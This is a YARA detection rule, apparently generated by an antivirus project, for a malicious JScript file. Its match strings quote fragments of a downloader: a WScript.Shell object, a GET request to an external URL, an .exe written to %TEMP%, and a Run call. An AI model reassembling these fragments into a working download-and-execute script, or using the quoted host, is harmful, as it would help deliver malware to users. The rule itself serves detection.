rule sig_20160328_09ebb0e1705aa6cf0a72f798e143772a {
  meta:
    description = "datamaliciousorder - file 20160328_09ebb0e1705aa6cf0a72f798e143772a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "56006ceb67567b24711c62d74197f9c8dfff5c92a8393742f81950e72e59a505"

  strings:
    $s1  = "function Mvzji() {return Tgnrtx[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"MiyGwP2n.exe\";};" fullword ascii
    $s2  = "do {WScript[Sbmffriqno](Eestd() * 11)} while (Hmbwpun[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Pbxlgnizo(Mizik, Zdodezo){return Mizik - Zdodezo;};" fullword ascii
    $s4  = "Hmbwpun[Tleslixz](\"GET\", \"http://www.europaklasse-lbk.de/p4iska\", false);" fullword ascii
    $s5  = "var Tgnrtx = function Esgkilbv() {return WScript[Nrjvfwua](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Ehlfi(Fuyxqjqr){Tgnrtx[\"Run\"](Fuyxqjqr, Rhpmj, Rhpmj);};" fullword ascii
    $s7  = "function Txixci() {return ((Ihqenuh == true) && (Ihqenuh == Pznczspn)) ? 1 : Rhpmj;};" fullword ascii
    $s8  = "function Vnrkcu(Olwodtfbis) {var Anlywkuqd = (1, 2, 3, 4, 5, Olwodtfbis); return Anlywkuqd;};" fullword ascii
    $s9  = "function Eestd(){return 22;};" fullword ascii
    $s10 = "Pznczspn = true; " fullword ascii
    $s11 = "var Pznczspn = false;" fullword ascii
    $s12 = "var Ihqenuh = false;" fullword ascii
    $s13 = "var Lzfkh = new this[\"Date\"]();" fullword ascii
    $s14 = "return Pbxlgnizo(Zrzfnx, Nkouactdsu);" fullword ascii
    $s15 = "function Mrvoembrjw(){return Qgwcqywn;};" fullword ascii
    $s16 = "var Dvywp = false;" fullword ascii
    $s17 = " while (Xaadkmhre){" fullword ascii
    $s18 = "Ihqenuh = true; " fullword ascii
    $s19 = "function Adzdu()" fullword ascii
    $s20 = "function Cxmfhqm(){return Nrjvfwua;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}